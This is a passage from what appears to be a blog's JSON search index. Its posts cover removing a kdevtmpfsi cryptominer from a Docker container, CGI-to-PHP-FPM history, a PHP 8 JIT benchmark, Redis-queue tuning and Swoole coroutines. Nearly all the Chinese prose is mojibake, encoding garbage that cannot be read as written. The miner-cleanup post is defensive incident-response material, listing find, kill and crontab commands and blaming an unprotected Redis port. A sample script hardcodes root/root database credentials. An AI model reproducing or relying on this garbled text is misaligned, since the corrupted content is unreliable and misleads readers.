å˜çŸ¿æœº","slug":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi","date":"2020-12-03T14:04:11.000Z","updated":"2020-12-06T14:51:34.359Z","comments":true,"path":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","link":"","permalink":"https://www.0x2beace.com/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","excerpt":"æ˜¨å¤©æœ‰å°æµ‹è¯•æœåŠ¡å™¨è¢«å‘ŠçŸ¥æœåŠ¡å¼‚å¸¸ï¼Œè¿›æœåŠ¡å™¨ä¹‹åæ‰å‘ç°æ˜¯å› ä¸ºdocker å¼‚å¸¸é€€å‡ºäº†ã€‚ \b","text":"æ˜¨å¤©æœ‰å°æµ‹è¯•æœåŠ¡å™¨è¢«å‘ŠçŸ¥æœåŠ¡å¼‚å¸¸ï¼Œè¿›æœåŠ¡å™¨ä¹‹åæ‰å‘ç°æ˜¯å› ä¸ºdocker å¼‚å¸¸é€€å‡ºäº†ã€‚ \b å°†docker è¿è¡Œèµ·æ¥ä¹‹åï¼Œå‘ç°æœ‰ä¸ªä¸è®¤è¯†çš„è¿›ç¨‹ kdevtmpfsi å ç”¨CPU å¼‚å¸¸çš„å¤šï¼ŒGoogle ä¸€ä¸‹æ‰çŸ¥é“ï¼Œå¥½å®¶ä¼™ï¼ŒæœåŠ¡å™¨è¢«å½“æˆçŸ¿æœºäº†ã€‚ ç›´æ¥ kill å¹¶ä¸èƒ½å°†å…¶ç»“æŸæ‰ï¼Œå®ƒè¿˜æœ‰å®ˆæŠ¤è¿›ç¨‹åŠå¯èƒ½å­˜åœ¨çš„å®šæ—¶ä»»åŠ¡ã€‚ 1. é¦–å…ˆæŸ¥æ‰¾æ–‡ä»¶12$ find &#x2F; -name kinsing &#x2F;&#x2F; å®ˆæŠ¤è¿›ç¨‹$ find &#x2F; -name kdevtmpfsi &#x2F;&#x2F; æŒ–çŸ¿è¿›ç¨‹ å¦‚æœRedis æ˜¯è¿è¡Œåœ¨æœ¬åœ°ï¼Œä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶é€šå¸¸æ˜¯åœ¨/tmp/ç›®å½•ä¸‹ã€‚ å¦‚æœRedis æ˜¯ä»¥å®¹å™¨çš„æ–¹å¼è¿è¡Œï¼Œåˆ™é€šå¸¸æ˜¯åœ¨/var/lib/docker/overlay2/ï¼ˆå®¹å™¨çš„ /tmp/ ç›®å½•ï¼‰ä¸‹ã€‚ 2. å°†å…¶åˆ é™¤1$ rm -f kinsing kdevtmpfsi è¿™é‡Œè¢«æ„ŸæŸ“çš„å®¹å™¨ä¹Ÿä¸ä¸€å®šæ˜¯Redis ï¼Œæ¯”å¦‚æˆ‘çš„åˆ™æ˜¯PHPï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥åˆ°è¢«æ„ŸæŸ“çš„å®¹å™¨å†…æ‰èƒ½æ‰¾åˆ°ã€‚ 3. å¹²æ‰è¿›ç¨‹123$ ps -aux | grep kinsing$ ps -aux | grep kdevtmpfsi$ kill -9 pid 4. æŸ¥çœ‹å®šæ—¶ä»»åŠ¡1$ crontab -l å­˜åœ¨å®šæ—¶ä»»åŠ¡çš„ä¸ä¸€å®šæ˜¯å½“å‰ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾å…¶ä»–ç”¨æˆ·æ˜¯å¦å­˜åœ¨ä»»åŠ¡ï¼š 1$ for user in $(cut -f1 -d: &#x2F;etc&#x2F;passwd); do crontab -u $user -l; done å®šæ—¶ä»»åŠ¡è¿˜å¯èƒ½å­˜åœ¨äºä»¥ä¸‹åœ°æ–¹ï¼š /etc/crontab /var/spool/cron/ /var/spool/cron/crontabs/ è‡³æ­¤å°±å®Œæˆäº†ç—…æ¯’çš„æ¸…ç†ï¼Œç½‘ä¸Šåƒç¯‡ä¸€å¾‹çš„å…¨æ˜¯è¿™ç§å¤„ç†æ–¹å¼ï¼Œä½†è¿™ä¸ªæ–¹å¼å¹¶ä¸é€‚åˆæˆ‘ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œæ— è®ºæˆ‘æ€ä¹ˆåˆ é™¤ï¼Œç—…æ¯’è¿˜æ˜¯å­˜åœ¨ã€‚ å› ä¸ºç—…æ¯’æ˜¯ä¾èµ–äºå®¹å™¨ç”Ÿå­˜çš„ï¼Œäºæ˜¯æˆ‘ä¾¿å°†å®¹å™¨åœæ­¢æ‰ï¼Œé€šè¿‡docker logs å®æ—¶æŸ¥çœ‹å®¹å™¨æœ€å10æ¡æ—¥å¿—ï¼š 1docker logs -f -t --tail 10 &lt;å®¹å™¨id&#x2F;å®¹å™¨åç§°&gt; ååˆ†é’Ÿä¹‹åï¼Œæ€»ç®—è®©æˆ‘é€®åˆ°äº†ï¼š è™½ç„¶ç›®ç¹äº†å…¨è¿‡ç¨‹ï¼Œä½†è¿™æ—¶æˆ‘ä¾ç„¶æ— èƒ½ä¸ºåŠ›ï¼Œå› ä¸ºæˆ‘ä¸çŸ¥é“ä¸Šé¢é‚£äº›å‘½ä»¤æ˜¯å¦‚ä½•è‡ªåŠ¨å¯åŠ¨çš„ã€‚ å°è¯•äº†å„ç§æ–¹å¼ï¼Œä½†éƒ½æ— è§£ï¼Œååˆ†é’Ÿä¹‹åç—…æ¯’è¿˜æ˜¯ä¼šå‡ºæ¥ï¼Œæœ€ç»ˆæˆ‘åªèƒ½æŠŠè¿™ä¸ªè¢«æ„ŸæŸ“çš„å®¹å™¨ç»™å¼ƒç”¨äº†ï¼Œé‡æ–°èµ·ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚ æ€»ç»“kdevtmpfsiç—…æ¯’çš„äº§ç”Ÿï¼Œé€šå¸¸æ˜¯å› ä¸ºRedis å¯¹å¤–å¼€æ”¾ 6379ç«¯å£ï¼Œä¸”æ²¡è®¾ç½®å¯†ç æˆ–è€…å¯†ç è¿‡äºç®€å•å¯¼è‡´ã€‚ æ‰€ä»¥æœåŠ¡å™¨ä¸€å®šè¦è®¾ç½®å¥½é˜²ç«å¢™ï¼Œåƒ3306ã€6379 è¿™ç§å¸¸ç”¨ç«¯å£ï¼Œå°½é‡å‡å°‘å¯¹å¤–å¼€æ”¾çš„æœºä¼šã€‚ å‚è€ƒé“¾æ¥ Linux.Packed.753","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP-FPM è¿›åŒ–å²","slug":"the-evolution-of-php-fpm","date":"2020-12-02T13:42:16.000Z","updated":"2021-01-03T08:14:50.203Z","comments":true,"path":"the-evolution-of-php-fpm/","link":"","permalink":"https://www.0x2beace.com/the-evolution-of-php-fpm/","excerpt":"æœ€è¿‘æœ‰å¹¸è¯»åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä¸€æ–‡å°†CGI çš„è¿›åŒ–å²è®²çš„ç‰¹åˆ«è¯¦ç»†ï¼Œè™½ç„¶æˆ‘è‡ªå·±ä¹‹å‰ä¹Ÿæ•´ç†è¿‡ CGIã€FastCGIã€PHP-FPM ç›¸å…³çš„ç¬”è®°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»åŸç†çš„è§’åº¦æ¥è®¤è¯† CGIã€‚","text":"æœ€è¿‘æœ‰å¹¸è¯»åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä¸€æ–‡å°†CGI çš„è¿›åŒ–å²è®²çš„ç‰¹åˆ«è¯¦ç»†ï¼Œè™½ç„¶æˆ‘è‡ªå·±ä¹‹å‰ä¹Ÿæ•´ç†è¿‡ CGIã€FastCGIã€PHP-FPM ç›¸å…³çš„ç¬”è®°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»åŸç†çš„è§’åº¦æ¥è®¤è¯† CGIã€‚ CGI çš„è¯ç”Ÿæ—©äº›å¹´çš„Web åº”ç”¨å¾ˆç®€å•ï¼Œå®¢æˆ·ç«¯é€šè¿‡æµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ç›´æ¥è¿”å›å“åº”ã€‚ éšç€äº’è”ç½‘çš„å‘å±•ï¼Œç®€å•çš„Web åº”ç”¨å·²ç»ä¸èƒ½æ»¡è¶³å¼€å‘è€…ä»¬äº†ã€‚æˆ‘ä»¬å¸Œæœ›WebæœåŠ¡å™¨æœ‰æ›´å¤šçš„åŠŸèƒ½ï¼Œé£é€Ÿå‘å±•çš„åŒæ—¶è¿˜èƒ½è®©ä¸åŒè¯­è¨€çš„å¼€å‘è€…ä¹Ÿèƒ½åŠ å…¥ã€‚ CGIåè®®åè®®çš„è¯ç”Ÿå°±æ˜¯ WebæœåŠ¡å™¨å’Œå…¶ä»–é¢†åŸŸçš„å¼€å‘è€…åœ¨ä¿è¯éµå®ˆåè®®çš„åŸºç¡€ä¸Šï¼Œå‰©ä¸‹çš„å¯ä»¥è‡ªç”±å‘æŒ¥ï¼Œè€Œå®ç°è¿™ä¸ªåè®®çš„è„šæœ¬å«åšCGI ç¨‹åºã€‚ CGIåè®®è§„å®šäº†éœ€è¦å‘CGIè„šæœ¬è®¾ç½®çš„ç¯å¢ƒå˜é‡å’Œä¸€äº›å…¶ä»–ä¿¡æ¯ï¼ŒCGIç¨‹åºå®ŒæˆæŸä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥ç”¨PHPï¼ŒPythonï¼ŒShellæˆ–è€…Cè¯­è¨€ç¼–å†™ã€‚ åœ¨æ²¡æœ‰CGI ä¹‹å‰ï¼Œå…¶ä»–è¯­è¨€å¦‚æœéœ€è¦æ¥å…¥Mysql æˆ–è€…Memcacheï¼Œè¿˜éœ€è¦ä½¿ç”¨C è¯­è¨€ï¼Œä½†æœ‰äº†CGIåè®®ï¼Œæˆ‘ä»¬çš„Webå¤„ç†æµç¨‹å¯ä»¥å˜æˆä¸‹å›¾è¿™æ ·ï¼š FastCGI çš„è¯ç”ŸCGIç¨‹åºå­˜åœ¨è‡´å‘½çš„ç¼ºç‚¹ï¼šæ¯å½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†è¯·æ±‚è½¬å‘ç»™CGIï¼ŒWEB æœåŠ¡å™¨å°±è¯·æ±‚æ“ä½œç³»ç»Ÿç”Ÿæˆä¸€ä¸ªæ–°çš„CGIè§£é‡Šå™¨è¿›ç¨‹(å¦‚php-cgiï¼‰ï¼ŒCGIè¿›ç¨‹åˆ™å¤„ç†å®Œä¸€ä¸ªè¯·æ±‚åé€€å‡ºï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚æ¥æ—¶å†åˆ›å»ºæ–°è¿›ç¨‹ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œæ‰§è¡Œä¸€ä¸ªPHPç¨‹åºçš„å¿…é¡»è¦å…ˆè§£æphp.iniæ–‡ä»¶ï¼Œç„¶åæ¨¡å—åˆå§‹åŒ–ç­‰ç­‰ä¸€ç³»åˆ—å·¥ä½œï¼Œæ¯æ¬¡éƒ½åå¤è¿™æ ·éå¸¸æµªè´¹èµ„æºã€‚ FastCGIåè®®åœ¨CGIåè®®çš„åŸºç¡€ä¸Šï¼Œåšå‡ºäº†å¦‚ä¸‹æ”¹å˜ï¼š FastCGIè¢«è®¾è®¡ç”¨æ¥æ”¯æŒå¸¸é©»ï¼ˆlong-livedï¼‰åº”ç”¨è¿›ç¨‹ï¼Œå‡å°‘äº†fork-and-executeå¸¦æ¥çš„å¼€é”€ FastCGIè¿›ç¨‹é€šè¿‡ç›‘å¬çš„socketï¼Œæ”¶æ¥è‡ªWebæœåŠ¡å™¨çš„è¿æ¥ï¼Œè¿™æ ·FastCGI è¿›ç¨‹å¯ä»¥ç‹¬ç«‹éƒ¨ç½² æœåŠ¡å™¨å’ŒFastCGIç›‘å¬çš„socket ä¹‹é—´æŒ‰ç…§æ¶ˆæ¯çš„å½¢å¼å‘é€ç¯å¢ƒå˜é‡å’Œå…¶ä»–æ•°æ® æˆ‘ä»¬ç§°å®ç°äº†FastCGIåè®®çš„ç¨‹åºä¸ºFastCGIç¨‹åºï¼ŒFastCGIç¨‹åºçš„äº¤äº’æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š PHP-FPM çš„è¯ç”ŸFastCGI ç¨‹åºå›ºç„¶å·²ç»å¾ˆå¥½äº†ï¼Œä½†æˆ‘ä»¬çš„éœ€æ±‚æ€»æ˜¯æœ‰ç‚¹è‹›åˆ»ï¼Œå®ƒè¿˜æ˜¯å­˜åœ¨ä¸€äº›æ˜æ˜¾ç¼ºç‚¹çš„ï¼š å½“æˆ‘ä»¬æ›´æ”¹é…ç½®æ–‡ä»¶(php.ini)åï¼Œphp-cgiï¼ˆFastCGI ç¨‹åºï¼‰ æ— æ³•å¹³æ»‘é‡å¯ æˆ‘ä»¬forkçš„è¿›ç¨‹ä¸ªæ•°å’Œè¯·æ±‚é‡æ­£æ¯”ï¼Œè¯·æ±‚ç¹å¿™æ—¶ fork è¿›ç¨‹å¤šï¼ŒåŠ¨æ€è°ƒæ•´ php-cgiè¿˜æ²¡åšåˆ° ä¸Šé¢æåŠphp-cgi å®ç°çš„FastCGIé—®é¢˜å®˜æ–¹æ²¡æœ‰è§£å†³ï¼Œå¹¸è¿çš„æ˜¯æœ‰ç¬¬ä¸‰æ–¹å¸®æˆ‘ä»¬è§£å†³äº†ï¼Œå®ƒå°±æ˜¯ php-fpmã€‚ å®ƒå¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œä¸ä¾èµ–php-cgiï¼Œæ¢å¥è¯è¯´ï¼Œå®ƒè‡ªå·±å®ç°äº†FastCGIåè®®å¹¶ä¸”æ”¯æŒè¿›ç¨‹å¹³æ»‘é‡å¯ä¸”å¸¦è¿›ç¨‹ç®¡ç†åŠŸèƒ½ã€‚ è¿›ç¨‹åŒ…å« master è¿›ç¨‹å’Œ worker è¿›ç¨‹ä¸¤ç±»è¿›ç¨‹ã€‚ master è¿›ç¨‹åªæœ‰ä¸€ä¸ªï¼Œè´Ÿè´£ç›‘å¬ç«¯å£ï¼Œæ¥æ”¶æ¥è‡ªWeb Server çš„è¯·æ±‚ï¼Œè€Œ worker è¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ªï¼ˆå…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®ï¼‰ï¼Œæ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ªPHP è§£é‡Šå™¨ï¼Œæ˜¯PHP ä»£ç æ­£çœŸæ‰§è¡Œçš„åœ°æ–¹ã€‚ å‚è€ƒé“¾æ¥ ä»CGIåˆ°FastCGIåˆ°PHP-FPM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"PHP 8.0 åˆä½“éªŒ","slug":"php-8-0-first-experience","date":"2020-12-01T13:09:15.000Z","updated":"2020-12-02T00:03:35.910Z","comments":true,"path":"php-8-0-first-experience/","link":"","permalink":"https://www.0x2beace.com/php-8-0-first-experience/","excerpt":"æ˜¨å¤©ä½¿ç”¨ homebrew å®‰è£…è½¯ä»¶æ—¶ï¼Œç»“æœæŠŠæˆ‘æœ¬åœ°å·²å®‰è£…çš„è½¯ä»¶ä¸­èƒ½æ›´æ–°çš„å…¨éƒ¨ç»™æ›´æ–°äº†ä¸€éã€‚","text":"æ˜¨å¤©ä½¿ç”¨ homebrew å®‰è£…è½¯ä»¶æ—¶ï¼Œç»“æœæŠŠæˆ‘æœ¬åœ°å·²å®‰è£…çš„è½¯ä»¶ä¸­èƒ½æ›´æ–°çš„å…¨éƒ¨ç»™æ›´æ–°äº†ä¸€éã€‚ è¿™å…¶ä¸­å°±åŒ…æ‹¬ php8.0ã€‚åœ¨8.0 æ­£å¼å‡ºæ¥ä¹‹å‰ï¼Œæœ‰å¬è¯´è¿‡åŠ å…¥äº†æ–°ç‰¹æ€§ï¼šJITç¼–è¯‘ã€‚ ä»ç†è®ºä¸Šè®²ï¼ŒJITå¤„ç†PHPè„šæœ¬ç¼–è¯‘çš„æ–¹å¼èƒ½å¤Ÿæé«˜åº”ç”¨ç¨‹åºçš„é€Ÿåº¦ï¼Œä½†ç©¶ç«Ÿèƒ½æœ‰å¤šå¿«å‘¢ï¼Ÿä¸‹é¢é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹ã€‚ 123456789101112131415161718&lt;?php$startTime &#x3D; microtime(true);$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);function doSomething($db,$i)&#123; $hash &#x3D; md5($i); $db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \\&quot;$hash\\&quot;)&quot;);&#125;$i &#x3D; 1;while ($i&lt;100000) &#123; doSomething($mysqli, $i); $i++;&#125;$total &#x3D; microtime(true) - $startTime;var_dump(&quot;æ€»è€—æ—¶ï¼š&#123;$total&#125;ç§’&quot;); è¿™é‡Œåªæ˜¯ç®€å•çš„å‘æ•°æ®åº“ä¸é‡å¤æ’å…¥åä¸‡æ¡æ•°æ®ã€‚æˆ‘çŸ¥é“ç”¨è¿™ä¸ªè„šæœ¬ä¸¾ä¾‹å­å¹¶ä¸å¥½ï¼Œä½†å®ƒå´æ˜¯ç¦»æˆ‘æ—¥å¸¸ä½¿ç”¨æœ€è¿‘çš„ã€‚ php7.3 æµ‹è¯•ç»“æœï¼š php8.0 æœªå¼€å¯ JIT æ‰©å±•æµ‹è¯•ç»“æœï¼š php8.0 å·²å¼€å¯ JIT æ‰©å±•æµ‹è¯•ç»“æœï¼š å¯ä»¥çœ‹åˆ°ç›¸æ¯” 7.3ï¼Œè¶³è¶³å¿«äº†è¿‘ä¸‰åˆ†ä¹‹ä¸€ï¼ å½“ç„¶è¿™ä¸ªæµ‹è¯•ç»“æœä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œå¹¶ä¸å‡†ç¡®ï¼Œä½†çœ‹åˆ°æ•°å­—ä»å››åå¤šç§’ç¼©çŸ­åˆ°ä¸‰åç§’ï¼Œè¿˜æ˜¯å¾ˆæƒŠå–œçš„ã€‚ æˆ‘çš„ç”µè„‘é…ç½®ï¼š 3.5 GHz åŒæ ¸Intel Core i7 16 GB RAM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"è®°ä¸€æ¬¡ Linux æœåŠ¡å™¨æ€§èƒ½è°ƒä¼˜","slug":"remember-a-Linux-server-performance-tuning","date":"2020-11-30T15:45:09.000Z","updated":"2020-12-06T14:52:17.447Z","comments":true,"path":"remember-a-Linux-server-performance-tuning/","link":"","permalink":"https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/","excerpt":"è½®è¯¢æŸ¥ Db å¯¹æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰çš„å‹åŠ›ç©¶ç«Ÿæœ‰å¤šå¤§ï¼Ÿ","text":"è½®è¯¢æŸ¥ Db å¯¹æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰çš„å‹åŠ›ç©¶ç«Ÿæœ‰å¤šå¤§ï¼Ÿ å‰æ®µæ—¶é—´æ¥æ‰‹ä¸€ä¸ªè€ç³»ç»Ÿï¼Œå…¶ä¸­å¯¹äºâ€œè®¢å•â€çš„å¤„ç†ï¼Œéå¸¸åŸå§‹ä¸”ç®€å•ç²—æš´ã€‚ ç›´æ¥é€šè¿‡ä¸€ä¸ª PHP è„šæœ¬ä¸æ–­è½®è¯¢æŸ¥è¯¢æ•°æ®åº“ï¼Œç›´åˆ°æŸ¥æ‰¾åˆ°éœ€è¦å¤„ç†çš„â€œè®¢å•â€æ‰å»å¤„ç†ï¼Œå¦åˆ™ä¸€ç›´æŸ¥æ‰¾ã€‚ 12345678910111213&lt;?phpfunction doSomething()&#123; &#x2F;&#x2F; æŸ¥è¯¢æ•°æ®åº“ if ($exists)&#123; &#x2F;&#x2F; todo ... &#125;&#125;while(true)&#123; doSomething();&#125; ç±»ä¼¼çš„å¤„ç†è¿˜æœ‰å…¶ä»–å‡ ä¸ªè„šæœ¬ã€‚ å› ä¸ºé¡¹ç›®çš„å†å²åŒ…è¢±è¾ƒé‡ï¼Œä¹Ÿä¸å¥½åšä¸€äº›å¤§è°ƒæ•´ï¼Œèµ·åˆæˆ‘å¹¶æ²¡æœ‰å¤ªåœ¨æ„ï¼Œå°±ç›´æ¥éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šäº†ã€‚ å°±åœ¨æœ€è¿‘ï¼Œæˆ‘æ”¶åˆ°åé¦ˆï¼Œç³»ç»Ÿæœ‰é—®é¢˜ã€‚é€šè¿‡ä¸€ç³»åˆ—æ’æŸ¥æœ€åå‘ç°æ˜¯å› ä¸ºâ€œè®¢å•â€å¤„ç†ä¸åŠæ—¶ï¼Œâ€œè®¢å•â€å †ç§¯è¿‡å¤šå¯¼è‡´çš„ä¸€ç³»åˆ—é—®é¢˜ã€‚ æˆ‘å¯»æ€ç€ï¼Œç”¨æˆ·é‡ä¹Ÿæ²¡æœ‰å¾ˆå¤šï¼Œä¸ºä»€ä¹ˆä¼šå¤„ç†ä¸å®Œå‘¢ï¼Ÿä½¿ç”¨ glances å‘½ä»¤çœ‹äº†ä¸€çœ¼ã€‚ è¿™ä¸çœ‹ä¸çŸ¥é“ï¼Œä¸€çœ‹å“ä¸€è·³ï¼ŒCPU ç›´æ¥è­¦å‘Šäº†ã€‚æ— è®ºå¤šå¥½çš„æœºå™¨ä¹Ÿç»å—ä¸ä½è¿™æ ·æŠ˜è…¾ï¼Œèµ¶ç´§æŠŠè½®è¯¢æŸ¥è¡¨çš„æ–¹å¼æ”¹æˆäº†æŸ¥é˜Ÿåˆ—ã€‚ åŸºäºRedis çš„List å®ç°ä¸€ä¸ªç®€å•çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ›´æ–°åˆ°æœåŠ¡å™¨ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°CPU ç›´æ¥é™äº†ä¸€åŠã€‚ ä¸ºä»€ä¹ˆä½¿ç”¨Redis ä¼šæ¯”Mysql çš„æ•ˆæœè¦å¥½ï¼Ÿ é€šä¿—ä¸€ç‚¹è§£é‡Šæ˜¯å› ä¸ºRedis å­˜å‚¨æ˜¯åŸºäºå†…å­˜ï¼ŒMysql å­˜å‚¨æ˜¯åŸºäºç£ç›˜ï¼Œè€Œå†…å­˜çš„è¯»å†™è¦æ¯”ç£ç›˜å¿«ä¸æ­¢ä¸€ä¸ªæ•°é‡çº§ã€‚ å½“ç„¶ï¼Œä¸Šé¢çš„å¤„ç†æ–¹å¼å¹¶ä¸æ˜¯æœ€ä¼˜çš„ï¼Œè¿™é‡Œåªæ˜¯å•è®ºå¦‚ä½•å‘ç°æ€§èƒ½ç“¶é¢ˆï¼Œä»¥åŠå¦‚ä½•è°ƒä¼˜è¿™ä¸€ç‚¹æ¥è¿›è¡Œè¯´æ˜ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Swoole åç¨‹å­¦ä¹ ","slug":"swoole-coroutine-learning","date":"2020-11-29T14:36:47.000Z","updated":"2020-11-29T14:37:50.672Z","comments":true,"path":"swoole-coroutine-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-learning/","excerpt":"ç¬¬ä¸€æ¬¡æ¥è§¦åç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯åœ¨å­¦ä¹ Swooleæ—¶ï¼Œé‚£æ—¶çœ‹å®˜æ–¹æ–‡æ¡£å¹¶ä¸èƒ½å®Œå…¨ç†è§£åç¨‹åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ä»¥åŠè¯¥å¦‚ä½•æ­£ç¡®çš„ä½¿ç”¨å®ƒã€‚","text":"ç¬¬ä¸€æ¬¡æ¥è§¦åç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯åœ¨å­¦ä¹ Swooleæ—¶ï¼Œé‚£æ—¶çœ‹å®˜æ–¹æ–‡æ¡£å¹¶ä¸èƒ½å®Œå…¨ç†è§£åç¨‹åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ä»¥åŠè¯¥å¦‚ä½•æ­£ç¡®çš„ä½¿ç”¨å®ƒã€‚ åæ¥é€æ¸çœ‹äº†ä¸€äº›å†™çš„æ¯”è¾ƒé€šä¿—çš„æ–‡ç« ï¼ŒåŠ ä¸Šè‡ªå·±çš„ä¸€äº›ç†è§£ï¼Œé€æ­¥å¼€å§‹å¯¹åç¨‹æœ‰ä¸€äº›è®¤è¯†äº†ã€‚ è®¤è¯†åç¨‹åç¨‹ä¸æ˜¯è¿›ç¨‹æˆ–çº¿ç¨‹ï¼Œå…¶æ‰§è¡Œè¿‡ç¨‹æ›´ç±»ä¼¼äºå­ä¾‹ç¨‹ï¼Œæˆ–è€…è¯´ä¸å¸¦è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨ã€‚ ä¸Šé¢é‚£å¥è¯å¾ˆå…³é”®ï¼Œä¸€å¥è¯å°±æŠŠåç¨‹æ˜¯ä»€ä¹ˆï¼Œä¸æ˜¯ä»€ä¹ˆè¯´æ¸…æ¥šäº†ã€‚ ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°åç¨‹ä¸å¤šè¿›ç¨‹çš„åŒºåˆ«ï¼š æ‰§è¡Œé¡ºåºä¸‹é¢è¿™æ®µä»£ç ä¸»è¦åšäº†ä¸‰ä»¶äº‹ï¼šå†™å…¥æ–‡ä»¶ã€å‘é€é‚®ä»¶ä»¥åŠæ’å…¥æ•°æ®ã€‚ 12345678910111213141516171819202122232425&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ usleep(3000); echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;å‘é€é‚®ä»¶ç»™500åä¼šå‘˜,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;æ¨¡æ‹Ÿæ’å…¥100æ¡æ•°æ®,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; &#125;&#125;task1();task2();task3(); è¿™æ®µä»£ç å’Œä¸Šé¢ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸‰ä»¶äº‹æƒ…æ˜¯äº¤å‰æ‰§è¡Œçš„ï¼Œæ¯ä¸ªä»»åŠ¡æ‰§è¡Œå®Œä¸€æ¬¡ä¹‹åï¼Œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä»»åŠ¡ï¼Œå¦‚æ­¤å¾ªç¯ã€‚ ç±»ä¼¼äºè¿™æ ·çš„æ‰§è¡Œé¡ºåºï¼Œå°±æ˜¯åç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpfunction task1($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 300) &#123; return false;&#x2F;&#x2F;è¶…è¿‡300ä¸ç”¨å†™äº† &#125; echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task2($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† å‘é€é‚®ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 500) &#123; return false;&#x2F;&#x2F;è¶…è¿‡500ä¸ç”¨å‘é€äº† &#125; echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task3($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† æ’å…¥æ•°æ®,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 100) &#123; return 